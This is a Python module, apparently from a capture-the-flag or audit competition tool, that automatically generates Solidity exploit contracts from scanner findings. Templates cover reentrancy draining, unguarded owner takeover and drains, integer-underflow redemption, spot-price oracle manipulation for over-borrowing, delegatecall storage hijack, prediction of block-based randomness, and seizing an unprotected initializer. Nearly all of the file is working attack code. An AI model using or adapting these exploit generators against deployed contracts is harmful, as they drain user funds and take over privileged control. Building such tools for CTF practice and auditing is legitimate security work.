# TRUST404 Track04 — strategy selection + Exploit.sol templates.
# 각 취약 유형에 대해, scanner 가 뽑은 함수 시그니처를 채워 Exploit.sol 을
# 결정론적으로 생성한다. 함수 시그니처는 현재 입력의 스캔 결과에서만 가져오며,
# 필요한 capability가 불완전하면 후보를 만들지 않고 다음 탐색 단계로 넘긴다.
import random
import re

from scanner import (
    FAM_REENTRANCY, FAM_ACCESS, FAM_INTEGER, FAM_ORACLE,
    FAM_DELEGATECALL, FAM_RANDOMNESS, FAM_INIT,
)

STRATEGY_ORDER = [
    FAM_REENTRANCY, FAM_ACCESS, FAM_INTEGER, FAM_ORACLE,
    FAM_DELEGATECALL, FAM_RANDOMNESS, FAM_INIT,
]

HEADER = "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.20;\n\n"


def seeded_order(order, scores, seed):
    """Deterministic ordering: score desc, ties broken by a seeded PRNG so the
    same --seed always yields the same sequence."""
    rng = random.Random(seed)
    buckets = {}
    for fam in order:
        buckets.setdefault(scores.get(fam, 0), []).append(fam)
    result = []
    for score in sorted(buckets.keys(), reverse=True):
        group = buckets[score][:]
        rng.shuffle(group)
        result.extend(group)
    return result


def build_exploit(fam, findings):
    scores = findings["scores"]
    if scores.get(fam, 0) <= 0:
        return None
    if fam == FAM_REENTRANCY:
        return _reentrancy(findings)
    if fam == FAM_ACCESS:
        return _access(findings)
    if fam == FAM_INTEGER:
        return _integer(findings)
    if fam == FAM_ORACLE:
        return _oracle(findings)
    if fam == FAM_DELEGATECALL:
        return _delegatecall(findings)
    if fam == FAM_RANDOMNESS:
        return _randomness(findings)
    if fam == FAM_INIT:
        return _init(findings)
    return None


def _reentrancy(findings):
    deposit_fn = findings.get("reentrancy_deposit")
    wfn = findings.get("reentrancy_withdraw")
    if not deposit_fn or not wfn:
        return None
    deposit = deposit_fn["name"]
    withdraw = wfn["name"]
    # withdraw may take a uint amount or no args
    wargs = wfn["args"] if wfn else []
    takes_amount = any(t.startswith("uint") for t, _ in wargs)
    if takes_amount:
        iface = (f"interface ITarget {{\n"
                 f"    function {deposit}() external payable;\n"
                 f"    function {withdraw}(uint256 amount) external;\n"
                 f"}}\n\n")
        run_call = f"target.{withdraw}(unit);"
        re_call = f"target.{withdraw}(unit);"
    else:
        iface = (f"interface ITarget {{\n"
                 f"    function {deposit}() external payable;\n"
                 f"    function {withdraw}() external;\n"
                 f"}}\n\n")
        run_call = f"target.{withdraw}();"
        re_call = f"target.{withdraw}();"
    body = (
        "// Strategy: reentrancy (CEI violation) — re-enter withdraw before the\n"
        "// balance is zeroed, draining the seed float below the solvency floor.\n"
        + iface +
        "contract Exploit {\n"
        "    ITarget public target;\n"
        "    uint256 public unit;\n\n"
        "    function run(address _t) external payable {\n"
        "        target = ITarget(_t);\n"
        "        unit = 1 ether;\n"
        f"        target.{deposit}{{value: unit}}();\n"
        f"        {run_call}\n"
        "    }\n\n"
        "    receive() external payable {\n"
        f"        if (address(target).balance >= unit) {{ {re_call} }}\n"
        "    }\n"
        "}\n"
    )
    return HEADER + body


def _access(findings):
    drain = findings.get("access_drain")
    setowner = findings.get("access_setowner")
    predicates = [str(p).lower() for p in findings.get("invariant_predicates", [])]
    first_predicate = predicates[0] if predicates else ""

    # Prefer the shortest action that directly breaks the first ordered
    # predicate.  checkAll reports that predicate first, so performing both an
    # ownership takeover and a drain only makes the PoC larger and adds another
    # possible revert without strengthening the proof.
    use_setowner = bool(setowner)
    use_drain = bool(drain)
    if setowner and ("owner" in first_predicate or "admin" in first_predicate):
        use_drain = False
    elif drain and any(k in first_predicate for k in
                       ("solvent", "balance", "reserve", "fund")):
        use_setowner = False

    lines = []
    ifaces = []
    if use_setowner:
        ifaces.append(f"    function {setowner['name']}(address newOwner) external;")
    if use_drain:
        # signature: figure out arg order (address to, uint amount) heuristically
        args = drain["args"]
        addr_first = args and args[0][0] == "address"
        if addr_first and len(args) >= 2:
            ifaces.append(f"    function {drain['name']}(address to, uint256 amount) external;")
            lines.append(f"        t.{drain['name']}(address(this), address(_t).balance);")
        elif len(args) >= 1 and args[0][0].startswith("uint"):
            ifaces.append(f"    function {drain['name']}(uint256 amount) external;")
            lines.append(f"        t.{drain['name']}(address(_t).balance);")
        else:
            ifaces.append(f"    function {drain['name']}() external;")
            lines.append(f"        t.{drain['name']}();")
    if use_setowner:
        lines.insert(0, f"        t.{setowner['name']}(address(this));")
    if not lines:
        return None
    receive = "    receive() external payable {}\n" if use_drain else ""
    body = (
        "// Strategy: broken access control — make the shortest unguarded call\n"
        "// that violates the first invariant selected by the manifest.\n"
        "interface ITarget {\n" + "\n".join(ifaces) + "\n}\n\n"
        "contract Exploit {\n"
        "    function run(address _t) external payable {\n"
        "        ITarget t = ITarget(_t);\n"
        + "\n".join(lines) + "\n"
        "    }\n"
        + receive +
        "}\n"
    )
    return HEADER + body


def _integer(findings):
    transfer_fn = findings.get("integer_transfer")
    redeem_fn = findings.get("integer_redeem")
    if not transfer_fn or not redeem_fn:
        return None
    transfer = transfer_fn["name"]
    redeem = redeem_fn["name"]
    body = (
        "// Strategy: integer underflow (unchecked) — underflow the caller's\n"
        "// balance to ~2**256 via transfer, then redeem the entire ETH float.\n"
        "interface ITarget {\n"
        f"    function {transfer}(address to, uint256 amount) external;\n"
        f"    function {redeem}(uint256 amount) external;\n"
        "}\n\n"
        "contract Exploit {\n"
        "    function run(address _t) external payable {\n"
        "        ITarget t = ITarget(_t);\n"
        f"        t.{transfer}(address(0xdEaD), 1);\n"
        f"        t.{redeem}(address(_t).balance);\n"
        "    }\n"
        "    receive() external payable {}\n"
        "}\n"
    )
    return HEADER + body


def _oracle(findings):
    required = [findings.get(key) for key in (
        "oracle_faucet", "oracle_swap", "oracle_deposit", "oracle_borrow")]
    if not all(required):
        return None
    faucet, swap, deposit, borrow = (fn["name"] for fn in required)
    body = (
        "// Strategy: spot-price oracle manipulation — mint free BOR from the\n"
        "// faucet, swap it to drain COL reserves and spike the spot price, then\n"
        "// deposit the received COL and borrow against the inflated valuation.\n"
        "interface IERC20 {\n"
        "    function approve(address s, uint256 a) external returns (bool);\n"
        "    function balanceOf(address w) external view returns (uint256);\n"
        "}\n"
        "interface IPool {\n"
        f"    function {swap}(uint256 borIn) external;\n"
        "    function spotPrice() external view returns (uint256);\n"
        "}\n"
        "interface ITarget {\n"
        "    function collateralToken() external view returns (address);\n"
        "    function borrowToken() external view returns (address);\n"
        "    function pool() external view returns (address);\n"
        f"    function {faucet}() external;\n"
        f"    function {deposit}(uint256 amount) external;\n"
        f"    function {borrow}(uint256 amount) external;\n"
        "    function collateralOf(address w) external view returns (uint256);\n"
        "}\n\n"
        "contract Exploit {\n"
        "    function run(address _t) external payable {\n"
        "        ITarget o = ITarget(_t);\n"
        "        IERC20 col = IERC20(o.collateralToken());\n"
        "        IERC20 bor = IERC20(o.borrowToken());\n"
        "        address pool = o.pool();\n"
        f"        for (uint256 i = 0; i < 5; i++) {{ o.{faucet}(); }}\n"
        "        uint256 borBal = bor.balanceOf(address(this));\n"
        "        bor.approve(pool, type(uint256).max);\n"
        f"        IPool(pool).{swap}(borBal);\n"
        "        uint256 colBal = col.balanceOf(address(this));\n"
        "        col.approve(_t, type(uint256).max);\n"
        f"        o.{deposit}(colBal);\n"
        "        uint256 price = IPool(pool).spotPrice();\n"
        "        uint256 value = (o.collateralOf(address(this)) * price) / 1e18;\n"
        f"        o.{borrow}(value);\n"
        "    }\n"
        "    receive() external payable {}\n"
        "}\n"
    )
    return HEADER + body


def _delegatecall(findings):
    """Ethernaut Delegation/Preservation class: the target delegatecalls an
    attacker-supplied module, so a module that writes storage slot 0 seizes
    `owner`/`admin`. We deploy such a module and route the target through it."""
    entry = findings.get("delegatecall_entry")
    if not entry or not entry.get("has_bytes"):
        return None
    name = entry["fn"]["name"]
    # Reconstruct the entry signature: (address <recv>, bytes <data>) in the
    # order they were declared, so we call it exactly as the target expects.
    args = entry["fn"]["args"]
    parts = []
    call_args = []
    for typ, _an in args:
        if typ == "address":
            parts.append("address")
            call_args.append("address(pwn)")
        elif typ.startswith("bytes"):
            parts.append("bytes calldata")  # reference type needs a data location
            call_args.append('abi.encodeWithSignature("hijack()")')
        elif typ.startswith("uint"):
            parts.append("uint256")
            call_args.append("0")
        else:
            parts.append(typ)
            call_args.append("0")
    sig_types = ",".join(parts)
    call = f"        t.{name}({', '.join(call_args)});"
    slot = 0
    try:
        from trust404.layout import privileged_slot, pwn_hijack
        slot = privileged_slot(findings.get("src") or "")
        pwn_body = pwn_hijack(slot)
    except Exception:
        pwn_body = (
            "    address public slot0;\n"
            "    function hijack() external { slot0 = msg.sender; }\n"
        )
    body = (
        "// Strategy: delegatecall hijack — the target delegatecalls a module\n"
        "// we control, so our module runs in the target's storage context and\n"
        f"// overwrites slot {slot} (owner/admin). No import needed.\n"
        "interface ITarget {\n"
        f"    function {name}({sig_types}) external;\n"
        "}\n\n"
        "contract Pwn {\n"
        + pwn_body +
        "}\n\n"
        "contract Exploit {\n"
        "    function run(address _t) external payable {\n"
        "        ITarget t = ITarget(_t);\n"
        "        Pwn pwn = new Pwn();\n"
        f"{call}\n"
        "    }\n"
        "    receive() external payable {}\n"
        "}\n"
    )
    return HEADER + body


def _randomness(findings):
    """Ethernaut CoinFlip / Capture-the-Ether Predict-the-Future class: the
    payout is gated on block entropy the caller can read in the same tx. We
    replicate the exact mixing expression and always submit the winning value,
    looping until the house float is drained below its solvency floor."""
    fn = findings.get("randomness_fn")
    if not fn:
        return None
    name = fn["name"]
    b = fn["body"]
    # Reproduce the target's own entropy expression verbatim so the computed
    # value is identical (block.* globals resolve the same inside Exploit).
    # Capture the full right-hand side of the entropy-bearing assignment up to
    # its terminating ';' — this keeps nested parentheses balanced and picks up
    # any trailing `% N` mixing without brittle sub-parsing.
    rhs = re.search(r"=\s*([^;]*(?:block\.|blockhash)[^;]*?)\s*;", b, re.S)
    if rhs:
        rand_expr = rhs.group(1).strip()
    else:
        # fall back to a common predictable source
        rand_expr = "uint256(blockhash(block.number - 1))"
    ante_m = re.search(r"msg\.value\s*==\s*(\d+)\s*ether", b)
    ante = f"{ante_m.group(1)} ether" if ante_m else "1 ether"
    payout_m = re.search(r"call\s*\{\s*value\s*:\s*(\d+)\s*ether", b)
    payout = f"{payout_m.group(1)} ether" if payout_m else "1 ether"
    # match the guess parameter type (default uint256)
    guess_type = "uint256"
    for typ, _an in fn["args"]:
        if typ.startswith("uint") or typ == "bool":
            guess_type = "uint256" if typ.startswith("uint") else "bool"
            break
    if guess_type == "bool":
        pick = f"(({rand_expr}) == 1)"
        param = "bool"
    else:
        pick = f"({rand_expr})"
        param = "uint256"
    getters = []
    try:
        from trust404.layout import rewrite_mixed
        pick, getters = rewrite_mixed(pick, findings.get("src") or "", obj="t")
    except Exception:
        getters = []
    getter_ifaces = "".join(
        f"    function {g}() external view returns (uint256);\n" for g in getters
    )
    body = (
        "// Strategy: weak randomness — the payout is decided by block entropy\n"
        "// mixed with public nonce/seed we read off the target in the same tx.\n"
        "interface ITarget {\n"
        f"    function {name}({param} guess) external payable;\n"
        + getter_ifaces +
        "}\n\n"
        "contract Exploit {\n"
        f"    uint256 constant ANTE = {ante};\n"
        f"    uint256 constant PAYOUT = {payout};\n"
        "    function run(address _t) external payable {\n"
        "        ITarget t = ITarget(_t);\n"
        "        for (uint256 i = 0; i < 64; i++) {\n"
        "            if (_t.balance < PAYOUT) break;\n"
        f"            {param} guess = {pick};\n"
        f"            t.{name}{{value: ANTE}}(guess);\n"
        "        }\n"
        "    }\n"
        "    receive() external payable {}\n"
        "}\n"
    )
    return HEADER + body


def _init(findings):
    """Ethernaut Motorbike / uninitialized-proxy class: an initializer with no
    `initialized` guard and no access control lets the first caller take the
    admin/owner slot. We simply call it and become the privileged account."""
    fn = findings.get("init_fn")
    if not fn:
        return None
    name = fn["name"]
    addr_args = [a for a in fn["args"] if a[0] == "address"]
    if addr_args:
        iface = f"    function {name}(address) external;"
        call = f"        t.{name}(address(this));"
    elif fn["args"]:
        # unexpected arity — fall back to no-arg attempt guarded by interface
        iface = f"    function {name}() external;"
        call = f"        t.{name}();"
    else:
        iface = f"    function {name}() external;"
        call = f"        t.{name}();"
    body = (
        "// Strategy: unprotected initializer — the admin/owner slot is left\n"
        "// claimable, so we call the open initializer and seize it.\n"
        "interface ITarget {\n"
        f"{iface}\n"
        "}\n\n"
        "contract Exploit {\n"
        "    function run(address _t) external payable {\n"
        "        ITarget t = ITarget(_t);\n"
        f"{call}\n"
        "    }\n"
        "    receive() external payable {}\n"
        "}\n"
    )
    return HEADER + body
